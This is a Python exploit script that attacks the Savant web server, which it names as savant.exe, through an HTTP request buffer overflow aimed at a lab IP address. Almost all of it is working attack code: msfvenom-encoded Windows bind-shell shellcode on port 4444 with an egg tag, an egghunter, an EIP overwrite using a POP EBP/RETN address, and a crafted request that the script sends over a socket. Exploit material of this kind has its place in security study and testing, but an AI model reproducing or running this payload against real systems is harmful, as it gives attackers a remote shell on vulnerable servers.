#!/usr/bin/python
import socket

target_address="172.16.73.130"
target_port=80

buffer2 = "R0cX" + "R0cX" 
# msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.130 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
buffer2 += ("\xd9\xcd\xba\x88\xb6\x28\x02\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x53\x31\x56\x17\x83\xee\xfc\x03\xde\xa5\xca\xf7\x22\x21\x88"
"\xf8\xda\xb2\xed\x71\x3f\x83\x2d\xe5\x34\xb4\x9d\x6d\x18\x39"
"\x55\x23\x88\xca\x1b\xec\xbf\x7b\x91\xca\x8e\x7c\x8a\x2f\x91"
"\xfe\xd1\x63\x71\x3e\x1a\x76\x70\x07\x47\x7b\x20\xd0\x03\x2e"
"\xd4\x55\x59\xf3\x5f\x25\x4f\x73\xbc\xfe\x6e\x52\x13\x74\x29"
"\x74\x92\x59\x41\x3d\x8c\xbe\x6c\xf7\x27\x74\x1a\x06\xe1\x44"
"\xe3\xa5\xcc\x68\x16\xb7\x09\x4e\xc9\xc2\x63\xac\x74\xd5\xb0"
"\xce\xa2\x50\x22\x68\x20\xc2\x8e\x88\xe5\x95\x45\x86\x42\xd1"
"\x01\x8b\x55\x36\x3a\xb7\xde\xb9\xec\x31\xa4\x9d\x28\x19\x7e"
"\xbf\x69\xc7\xd1\xc0\x69\xa8\x8e\x64\xe2\x45\xda\x14\xa9\x01"
"\x2f\x15\x51\xd2\x27\x2e\x22\xe0\xe8\x84\xac\x48\x60\x03\x2b"
"\xae\x5b\xf3\xa3\x51\x64\x04\xea\x95\x30\x54\x84\x3c\x39\x3f"
"\x54\xc0\xec\xaa\x5c\x67\x5f\xc9\xa1\xd7\x0f\x4d\x09\xb0\x45"
"\x42\x76\xa0\x65\x88\x1f\x49\x98\x33\x0e\xd6\x15\xd5\x5a\xf6"
"\x73\x4d\xf2\x34\xa0\x46\x65\x46\x82\xfe\x01\x0f\xc4\x39\x2e"
"\x90\xc2\x6d\xb8\x1b\x01\xaa\xd9\x1b\x0c\x9a\x8e\x8c\xda\x4b"
"\xfd\x2d\xda\x41\x95\xce\x49\x0e\x65\x98\x71\x99\x32\xcd\x44"
"\xd0\xd6\xe3\xff\x4a\xc4\xf9\x66\xb4\x4c\x26\x5b\x3b\x4d\xab"
"\xe7\x1f\x5d\x75\xe7\x1b\x09\x29\xbe\xf5\xe7\x8f\x68\xb4\x51"
"\x46\xc6\x1e\x35\x1f\x24\xa1\x43\x20\x61\x57\xab\x91\xdc\x2e"
"\xd4\x1e\x89\xa6\xad\x42\x29\x48\x64\xc7\x59\x03\x24\x6e\xf2"
"\xca\xbd\x32\x9f\xec\x68\x70\xa6\x6e\x98\x09\x5d\x6e\xe9\x0c"
"\x19\x28\x02\x7d\x32\xdd\x24\xd2\x33\xf4")

badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # egghunter searching for R0cX
badbuffer += "\x90" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN
httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buffer2

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()
